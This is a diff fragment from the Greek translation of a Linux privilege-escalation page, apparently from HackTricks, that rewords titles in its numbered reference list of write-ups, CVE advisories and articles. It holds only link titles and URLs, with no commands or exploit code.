 - [15] [Peppo (Proving Grounds) writeup](https://muzec0318.github.io/posts/PG/peppo.html)
-- [16] [Αποκτήστε πρόσβαση στο D-BUS](https://www.linuxjournal.com/article/7744)
-- [17] [SUID Executables Linux Privilege Escalation](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
-- [18] [Sudo Part-2 – Linux Privilege Escalation](https://juggernaut-sec.com/sudo-part-2-lpe)
-- [19] [Πώς να διαχειριστείτε ACLs στο Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
-- [20] [Redhat/CentOS root μέσω network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
+- [16] [Συνδεθείτε στο D-BUS](https://www.linuxjournal.com/article/7744)
+- [17] [Εκτελέσιμα SUID και κλιμάκωση προνομίων Linux](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
+- [18] [Sudo Μέρος 2 – Κλιμάκωση προνομίων Linux](https://juggernaut-sec.com/sudo-part-2-lpe)
+- [19] [Πώς να διαχειρίζεστε ACLs στο Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
+- [20] [Root σε Redhat/CentOS μέσω network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
 - [21] [Τι είναι το systemd;](https://www.linode.com/docs/guides/what-is-systemd/)
-- [22] [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
-- [23] [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
+- [22] [0xdf – HTB Eureka (bash arithmetic injection μέσω logs, συνολική αλυσίδα)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
+- [23] [Εγχειρίδιο GNU Bash – BASH_ENV (αρχείο εκκίνησης για μη διαδραστική λειτουργία)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
 - [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
-- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
-- [26] [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
-- [27] [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
-- [28] [Stratascale – CVE-2025-32463: Sudo Chroot Elevation of Privilege](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
-- [29] [Rich Mirch – CVE-2025-32462 and CVE-2025-32463 Sudo elevation-of-privilege vulnerabilities](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
+- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + κλιμάκωση προνομίων μέσω symlink TF_VAR)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
+- [26] [0xdf – HTB Slonik (αντιγραφή pg_basebackup μέσω cron → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
+- [27] [NVISO – Όπως κι αν το ονομάσετε, το VMware το αναβαθμίζει (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
+- [28] [Stratascale – CVE-2025-32463: Κλιμάκωση προνομίων μέσω Sudo Chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
+- [29] [Rich Mirch – Ευπάθειες κλιμάκωσης προνομίων sudo CVE-2025-32462 και CVE-2025-32463](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
 - [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
-- [31] [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
+- [31] [PEP 3147 – Κατάλογοι αποθετηρίων PYC](https://peps.python.org/pep-3147/)
 - [32] [Τεκμηρίωση Python importlib](https://docs.python.org/3/library/importlib.html)
 - [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
 - [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
-- [35] [Tweet από τον @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
-- [36] [redsiege.com - Καταγραφή Passwords στο Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
-- [37] [tech.feedyourhead.at - Λεπτομέρειες ενός Logrotate Race Condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
+- [35] [Tweet του @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
+- [36] [redsiege.com - Καταγραφή κωδικών πρόσβασης στο Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
+- [37] [tech.feedyourhead.at - Λεπτομέρειες για συνθήκη ανταγωνισμού στο logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
 {{#include ../../../banners/hacktricks-training.md}}
